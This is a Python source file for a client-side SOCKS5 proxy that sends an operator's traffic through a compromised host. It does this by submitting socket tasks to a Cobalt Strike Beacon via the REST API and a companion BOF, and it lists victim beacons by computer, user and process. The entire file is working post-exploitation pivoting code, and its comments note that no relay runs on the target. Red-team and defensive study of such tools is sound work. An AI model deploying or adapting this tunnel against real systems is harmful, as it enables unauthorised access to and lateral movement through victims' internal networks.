#!/usr/bin/env python3
"""
Client-side SOCKS5 listener for the socks5 BOF task pump.

The listener runs on the operator/client machine.  Each SOCKS5 connection is
translated into CONNECT/READ/WRITE/CLOSE BOF tasks and submitted to a Beacon
through the Cobalt Strike REST API.  No listener, thread, or relay runs on the
target; target sockets live in the Beacon process between BOF invocations.

Requires Cobalt Strike 4.12+ with the REST API server running, e.g.:

    ./csrestapi --pass <teamserver-password> --host <teamserver> --port 50050

The Team Server must be started with --experimental-db.
"""

import argparse
import base64
import json
import os
import queue
import re
import select
import signal
import socket
import ssl
import struct
import sys
import threading
import time
import urllib.error
import urllib.request

FRAME_MAGIC = 0x53355231

OP_CONNECT = 1
OP_READ = 2
OP_WRITE = 3
OP_CLOSE = 4
OP_PING = 5
OP_RESET = 6
OP_WRITE_READ = 7

R_OK = 0
R_AGAIN = 1
R_EOF = 2
R_ERR = 3
R_BAD = 4

MAX_CHUNK = 32768
MAX_STREAMS = 16

RESULT_RE = re.compile(
    r"S5R (\d+) (\d+) (\d+) ([0-9a-fA-F]*)[ \t\r]*$", re.MULTILINE
)


class RestError(Exception):
    pass


class BofError(Exception):
    pass


def build_frame(op, stream_id, payload=b"", timeout_ms=0):
    return struct.pack(
        ">IIIII", FRAME_MAGIC, op, stream_id & 0xFFFFFFFF,
        timeout_ms & 0xFFFFFFFF, len(payload),
    ) + payload


def connect_payload(host, port):
    raw = host.encode("ascii", "strict")
    if not raw or len(raw) > 255:
        raise UnicodeError("host name must be 1..255 bytes")
    return struct.pack(">H", port) + raw


class CSRest:
    def __init__(self, base_url, username, password, insecure=False,
                 ca_cert=None, request_timeout=30):
        self.base_url = base_url.rstrip("/")
        self.username = username
        self.password = password
        self.request_timeout = request_timeout
        self.token = None
        self._lock = threading.RLock()

        if insecure:
            self.context = ssl._create_unverified_context()
        else:
            self.context = ssl.create_default_context()
            if ca_cert:
                self.context.load_verify_locations(ca_cert)

    def _raw_request(self, method, path, body, token):
        url = self.base_url + path
        data = None
        headers = {}
        if body is not None:
            data = json.dumps(body).encode("utf-8")
            headers["Content-Type"] = "application/json"
        if token:
            headers["Authorization"] = "Bearer " + token

        req = urllib.request.Request(url, data=data, headers=headers,
                                     method=method)
        try:
            with urllib.request.urlopen(req, context=self.context,
                                        timeout=self.request_timeout) as resp:
                raw = resp.read()
                if not raw:
                    return None
                return json.loads(raw.decode("utf-8"))
        except urllib.error.HTTPError as exc:
            raw = exc.read()
            raise RestError(
                "%s %s -> HTTP %d: %s" %
                (method, path, exc.code, raw.decode("utf-8", "replace"))
            ) from exc
        except urllib.error.URLError as exc:
            raise RestError("%s %s -> %s" % (method, path, exc.reason)) from exc

    def login(self):
        body = {
            "username": self.username,
            "password": self.password,
            "duration_ms": 3600000,
        }
        resp = self._raw_request("POST", "/api/auth/login", body, None)
        token = (resp or {}).get("access_token")
        if not token:
            raise RestError("login response did not contain access_token")
        with self._lock:
            self.token = token
        return token

    def request(self, method, path, body=None):
        with self._lock:
            token = self.token
        if not token:
            token = self.login()
        try:
            return self._raw_request(method, path, body, token)
        except RestError as exc:
            if "HTTP 401" not in str(exc):
                raise
            token = self.login()
            return self._raw_request(method, path, body, token)

    def list_beacons(self):
        return self.request("GET", "/api/v1/beacons") or []

    def get_task(self, task_id):
        return self.request(
            "GET", "/api/v1/tasks/%s?format=structured" % task_id
        )

    def execute_bof(self, bid, bof_name, bof_bytes, frame):
        body = {
            "entrypoint": "go",
            "arguments": [
                {
                    "type": "binary",
                    "value": base64.b64encode(frame).decode("ascii"),
                }
            ],
        }
        if bof_name.startswith("@"):
            body["bof"] = bof_name
        else:
            body["bof"] = "@files/" + bof_name
            body["files"] = {
                bof_name: base64.b64encode(bof_bytes).decode("ascii"),
            }
        resp = self.request(
            "POST", "/api/v1/beacons/%s/execute/bof/pack" % bid, body
        )
        task_id = (resp or {}).get("taskId")
        if not task_id:
            raise RestError("BOF execution response did not contain taskId: %r"
                            % (resp,))
        return task_id

    def wait_task(self, task_id, timeout, poll_interval):
        deadline = time.time() + timeout
        terminal = {"OUTPUT_RECEIVED", "COMPLETED", "FAILED", "CANCELED",
                    "NOT_FOUND"}
        while time.time() < deadline:
            try:
                task = self.get_task(task_id)
            except RestError as exc:
                # The task id is not queryable for a moment after creation.
                if "HTTP 404" not in str(exc):
                    raise
                time.sleep(poll_interval)
                continue
            if task.get("taskStatus") in terminal:
                return task
            time.sleep(poll_interval)
        raise RestError("task %s did not finish within %ss" %
                        (task_id, timeout))


def task_output(task):
    parts = []
    for item in task.get("result") or []:
        if item.get("type") == "text" and "output" in item:
            parts.append(item["output"])
        elif "output" in item:
            parts.append(str(item["output"]))
    return "".join(parts)


def task_errors(task):
    return [e.get("message", "") for e in task.get("error") or []]


class TaskRunner:
    def __init__(self, cs, bid, bof_name, bof_bytes, task_timeout,
                 poll_interval, verbose=False):
        self.cs = cs
        self.bid = bid
        self.bof_name = bof_name
        self.bof_bytes = bof_bytes
        self.task_timeout = task_timeout
        self.poll_interval = poll_interval
        self.verbose = verbose
        self.queue = queue.Queue()
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()

    def submit(self, op, stream_id, payload=b"", timeout_ms=0):
        frame = build_frame(op, stream_id, payload, timeout_ms)
        future = Future()
        self.queue.put((frame, future))
        return future

    def _run(self):
        while True:
            item = self.queue.get()
            if item is None:
                return
            frame, future = item
            try:
                future.set_result(self._execute(frame))
            except Exception as exc:
                future.set_exception(exc)

    def _execute(self, frame):
        task_id = self.cs.execute_bof(self.bid, self.bof_name,
                                      self.bof_bytes, frame)
        task = self.cs.wait_task(task_id, self.task_timeout,
                                 self.poll_interval)
        status = task.get("taskStatus")
        if status in ("FAILED", "CANCELED", "NOT_FOUND"):
            raise BofError("task %s ended with %s: %s" % (
                task_id, status, " | ".join(task_errors(task)) or "no error"
            ))
        output = task_output(task)
        errors = task_errors(task)

        matches = RESULT_RE.findall(output)
        if not matches:
            if self.verbose and output:
                sys.stderr.write("[bof] %s\n" % output.strip())
            detail = output.strip()
            if errors:
                detail += " | " + " | ".join(errors)
            raise BofError("no S5R result from task %s: %s" %
                           (task_id, detail or "no output"))

        # The BOF writes exactly one result line per invocation.  If the
        # console echoes or prefixes anything else, prefer the last match.
        stream_id, status, err, hexdata = matches[-1]
        if self.verbose and (status != "0" or err != "0"):
            sys.stderr.write("[bof] %s\n" % output.strip())
        return int(stream_id), int(status), int(err), bytes.fromhex(hexdata)

    def run_sync(self, op, stream_id, payload=b"", timeout_ms=0,
                 timeout=None):
        fut = self.submit(op, stream_id, payload, timeout_ms)
        return fut.result(timeout if timeout is not None
                          else self.task_timeout + 30)

    def stop(self):
        self.queue.put(None)


class Future:
    def __init__(self):
        self._event = threading.Event()
        self._result = None
        self._exc = None

    def set_result(self, result):
        self._result = result
        self._event.set()

    def set_exception(self, exc):
        self._exc = exc
        self._event.set()

    def result(self, timeout=None):
        if not self._event.wait(timeout):
            raise TimeoutError("BOF task result timed out")
        if self._exc is not None:
            raise self._exc
        return self._result


class StreamIds:
    def __init__(self):
        self._next = 1
        self._lock = threading.Lock()

    def get(self):
        with self._lock:
            value = self._next
            self._next = (self._next + 1) & 0xFFFFFFFF
            if self._next == 0:
                self._next = 1
            return value


def recv_exact(sock, size):
    data = b""
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise ConnectionError("client closed during handshake")
        data += chunk
    return data


def socks_reply(code):
    return bytes([5, code, 0, 1, 0, 0, 0, 0, 0, 0])


def wsa_to_socks(err):
    mapping = {
        10061: 5,
        10060: 4,
        11001: 4,
        10051: 3,
        10050: 3,
        10065: 4,
        10054: 1,
        10053: 1,
    }
    return mapping.get(err, 1)


class SocksConnection(threading.Thread):
    def __init__(self, conn, peer, runner, stream_ids, config):
        super().__init__(daemon=True)
        self.conn = conn
        try:
            conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except OSError:
            pass
        self.peer = peer
        self.runner = runner
        self.stream_ids = stream_ids
        self.config = config
        self.stream_id = stream_ids.get()
        self.closed = threading.Event()

    def run(self):
        try:
            if not self._handshake():
                return
            self._relay()
        except (ConnectionError, OSError, BofError, RestError,
                TimeoutError) as exc:
            if self.config.verbose:
                sys.stderr.write("[socks] %s:%s: %s\n" %
                                 (self.peer[0], self.peer[1], exc))
        finally:
            self._close_stream()
            try:
                self.conn.close()
            except OSError:
                pass

    def _handshake(self):
        self.conn.settimeout(15)
        head = recv_exact(self.conn, 2)
        if head[0] != 5:
            return False
        nmethods = head[1]
        methods = recv_exact(self.conn, nmethods)
        if 0 not in methods:
            self.conn.sendall(bytes([5, 0xFF]))
            return False
        self.conn.sendall(bytes([5, 0]))

        head = recv_exact(self.conn, 4)
        ver, cmd, _, atyp = head
        if ver != 5:
            return False
        if cmd != 1:
            self.conn.sendall(socks_reply(7))
            return False

        if atyp == 1:
            host = socket.inet_ntoa(recv_exact(self.conn, 4))
        elif atyp == 3:
            length = recv_exact(self.conn, 1)[0]
            raw = recv_exact(self.conn, length)
            try:
                host = raw.decode("ascii")
            except UnicodeError:
                try:
                    host = raw.decode("idna")
                except UnicodeError:
                    self.conn.sendall(socks_reply(8))
                    return False
        elif atyp == 4:
            self.conn.sendall(socks_reply(8))
            return False
        else:
            self.conn.sendall(socks_reply(8))
            return False

        port = struct.unpack(">H", recv_exact(self.conn, 2))[0]
        if not host or port == 0:
            self.conn.sendall(socks_reply(1))
            return False

        try:
            payload = connect_payload(host, port)
        except UnicodeError:
            self.conn.sendall(socks_reply(8))
            return False

        try:
            fut = self.runner.submit(OP_CONNECT, self.stream_id, payload,
                                     self.config.connect_timeout_ms)
            _, status, err, _ = fut.result(self.config.op_timeout)
        except (BofError, RestError, TimeoutError):
            self.conn.sendall(socks_reply(1))
            return False
        if status != R_OK:
            self.conn.sendall(socks_reply(wsa_to_socks(err)))
            return False

        self.conn.sendall(socks_reply(0))
        self.conn.settimeout(None)
        if self.config.verbose:
            sys.stderr.write("[socks] %s:%s -> %s:%d (stream %d)\n" %
                             (self.peer[0], self.peer[1], host, port,
                              self.stream_id))
        return True

    def _relay(self):
        wrote = False
        while not self.closed.is_set():
            readable = False
            if not wrote:
                try:
                    readable, _, _ = select.select([self.conn], [], [], 0)
                except (OSError, ValueError):
                    return
            if readable:
                try:
                    data = self.conn.recv(MAX_CHUNK)
                except OSError:
                    return
                if not data:
                    return
                # Send the client bytes and wait for the server response in
                # the same BOF task.  This removes one task round trip per
                # request/response exchange.
                _, status, _, response = self.runner.run_sync(
                    OP_WRITE_READ, self.stream_id, data,
                    self.config.read_timeout_ms,
                    self.config.op_timeout,
                )
                if status == R_OK:
                    if response:
                        try:
                            self.conn.sendall(response)
                        except OSError:
                            return
                elif status == R_AGAIN:
                    # Write succeeded; the server response is not ready.
                    pass
                elif status == R_EOF:
                    try:
                        self.conn.shutdown(socket.SHUT_WR)
                    except OSError:
                        return
                    self._drain_client()
                    return
                else:
                    return
                wrote = False
                continue

            wrote = False

            _, status, _, data = self.runner.run_sync(
                OP_READ, self.stream_id, b"",
                self.config.read_timeout_ms,
                self.config.op_timeout,
            )
            if status == R_OK and data:
                try:
                    self.conn.sendall(data)
                except OSError:
                    return
            elif status == R_AGAIN:
                idle = getattr(self.config, "idle_poll_ms", 100)
                if idle > 0:
                    time.sleep(idle / 1000.0)
                continue
            elif status == R_EOF:
                # Half-close: report EOF to the client but keep reading from
                # the client until it closes its side, so uploads that finish
                # after the server's FIN are not truncated.
                try:
                    self.conn.shutdown(socket.SHUT_WR)
                except OSError:
                    return
                self._drain_client()
                return
            else:
                return

    def _drain_client(self):
        end = time.time() + getattr(self.config, "drain_timeout", 5.0)
        while not self.closed.is_set() and time.time() < end:
            try:
                readable, _, _ = select.select([self.conn], [], [], 0.5)
            except (OSError, ValueError):
                return
            if not readable:
                continue
            try:
                data = self.conn.recv(MAX_CHUNK)
            except OSError:
                return
            if not data:
                return
            _, status, _, _ = self.runner.run_sync(
                OP_WRITE, self.stream_id, data,
                self.config.write_timeout_ms,
                self.config.op_timeout,
            )
            if status != R_OK:
                return

    def _close_stream(self):
        if self.closed.is_set():
            return
        self.closed.set()
        try:
            fut = self.runner.submit(OP_CLOSE, self.stream_id, b"", 0)
            fut.result(self.config.op_timeout)
        except Exception:
            pass


def select_beacon(beacons, bid):
    alive = [b for b in beacons if b.get("alive", True)]
    if bid:
        for beacon in beacons:
            if str(beacon.get("bid")) == str(bid):
                return beacon
        raise SystemExit("beacon %s not found" % bid)
    if len(alive) == 1:
        return alive[0]
    if not alive:
        raise SystemExit("no live beacons")
    listing = "\n".join(
        "  %s  %s\\%s  %s  sleep %s" % (
            b.get("bid"), b.get("computer", "?"), b.get("user", "?"),
            b.get("process", "?"), (b.get("sleep") or {}).get("sleep", "?"),
        ) for b in alive
    )
    raise SystemExit("multiple live beacons; use --bid:\n" + listing)


def choose_bof(beacon, bof_arg):
    if bof_arg:
        return bof_arg
    arch = beacon.get("beaconArch") or "x64"
    suffix = "x86.o" if arch == "x86" else "x64.o"
    local = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "socks5." + suffix)
    return local


def load_bof(path):
    if path.startswith("@"):
        return path, b""
    with open(path, "rb") as handle:
        return os.path.basename(path), handle.read()


def parse_args():
    parser = argparse.ArgumentParser(
        description="Client-side SOCKS5 listener driven by the socks5 BOF "
                    "through the Cobalt Strike REST API."
    )
    parser.add_argument("--rest-url", default="https://127.0.0.1:50443")
    parser.add_argument("--user", default="csrestapi")
    parser.add_argument("--password",
                        default=os.environ.get("CS_REST_PASSWORD", ""))
    parser.add_argument("--bid", default=None,
                        help="Beacon id (required if several are alive)")
    parser.add_argument("--bof", default=None,
                        help="BOF object path, or @files/name or "
                             "@artifacts/path already on the REST server "
                             "(default: auto by beacon arch)")
    parser.add_argument("--listen", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1080)
    parser.add_argument("--insecure", action="store_true",
                        help="Do not verify the REST API TLS certificate")
    parser.add_argument("--ca-cert", default=None)
    parser.add_argument("--connect-timeout-ms", type=int, default=4000)
    parser.add_argument("--read-timeout-ms", type=int, default=500)
    parser.add_argument("--write-timeout-ms", type=int, default=4000)
    parser.add_argument("--task-timeout", type=float, default=180.0,
                        help="Seconds to wait for one BOF task")
    parser.add_argument("--drain-timeout", type=float, default=5.0,
                        help="Seconds to keep forwarding client data after "
                             "the target sends EOF")
    parser.add_argument("--poll-interval", type=float, default=0.1)
    parser.add_argument("--max-clients", type=int, default=MAX_STREAMS)
    parser.add_argument("--idle-poll-ms", type=int, default=25,
                        help="Pause after an empty READ before polling again")
    parser.add_argument("--reset", action="store_true",
                        help="Send RESET (close all BOF-held sockets) and exit")
    parser.add_argument("--reset-on-start", action="store_true")
    parser.add_argument("--reset-on-exit", action="store_true")
    parser.add_argument("--verbose", action="store_true")
    return parser.parse_args()


def main():
    if os.name == "nt":
        # Make CTRL_BREAK_EVENT behave like Ctrl+C so the finally block
        # runs and --reset-on-exit can close the target sockets.
        try:
            signal.signal(signal.SIGBREAK, signal.default_int_handler)
        except (AttributeError, ValueError):
            pass
    args = parse_args()
    if not args.password:
        raise SystemExit("REST password required (--password or "
                         "CS_REST_PASSWORD)")

    if args.max_clients > MAX_STREAMS:
        sys.stderr.write("[main] max-clients capped at BOF limit (%d)\n" %
                         MAX_STREAMS)
        args.max_clients = MAX_STREAMS
    args.op_timeout = args.task_timeout + 30
    cs = CSRest(args.rest_url, args.user, args.password, args.insecure,
                args.ca_cert)
    cs.login()
    beacon = select_beacon(cs.list_beacons(), args.bid)
    bid = str(beacon["bid"])

    bof_path = choose_bof(beacon, args.bof)
    try:
        bof_name, bof_bytes = load_bof(bof_path)
    except OSError as exc:
        raise SystemExit("could not read BOF %s: %s" % (bof_path, exc))

    if args.verbose:
        sys.stderr.write("[main] beacon %s (%s\\%s, %s, %s)\n" % (
            bid, beacon.get("computer", "?"), beacon.get("user", "?"),
            beacon.get("process", "?"), beacon.get("beaconArch", "?")))
        if bof_name.startswith("@"):
            sys.stderr.write("[main] bof %s (server-side)\n" % bof_name)
        else:
            sys.stderr.write("[main] bof %s (%d bytes)\n" %
                             (bof_name, len(bof_bytes)))

    runner = TaskRunner(cs, bid, bof_name, bof_bytes, args.task_timeout,
                        args.poll_interval, args.verbose)

    if args.reset_on_start or args.reset:
        runner.run_sync(OP_RESET, 0, b"", 0)
        if args.verbose:
            sys.stderr.write("[main] BOF state reset\n")
        if args.reset:
            runner.stop()
            return

    stream_id, status, err, _ = runner.run_sync(OP_PING, 0, b"", 0)
    if status != R_OK:
        raise SystemExit("BOF ping failed: status=%d err=%d" %
                         (status, err))
    if args.verbose:
        sys.stderr.write("[main] BOF ping ok (stream %d)\n" % stream_id)

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen, args.port))
    listener.listen(64)

    sys.stderr.write("[main] SOCKS5 listening on %s:%d via beacon %s\n" %
                     (args.listen, args.port, bid))

    stream_ids = StreamIds()
    clients = []
    active = threading.Semaphore(args.max_clients)

    try:
        while True:
            conn, peer = listener.accept()
            if not active.acquire(blocking=False):
                # Too many streams; refuse politely without a SOCKS reply.
                conn.close()
                continue

            handler = SocksConnection(conn, peer, runner, stream_ids, args)

            def run_handler(h=handler):
                try:
                    h.run()
                finally:
                    active.release()

            thread = threading.Thread(target=run_handler, daemon=True)
            thread.start()
            clients = [c for c in clients if c.is_alive()]
            clients.append(thread)
    except KeyboardInterrupt:
        sys.stderr.write("\n[main] shutting down\n")
    finally:
        listener.close()
        if args.reset_on_exit:
            try:
                runner.run_sync(OP_RESET, 0, b"", 0)
                if args.verbose:
                    sys.stderr.write("[main] BOF state reset\n")
            except Exception as exc:
                sys.stderr.write("[main] reset failed: %s\n" % exc)
        runner.stop()


if __name__ == "__main__":
    main()
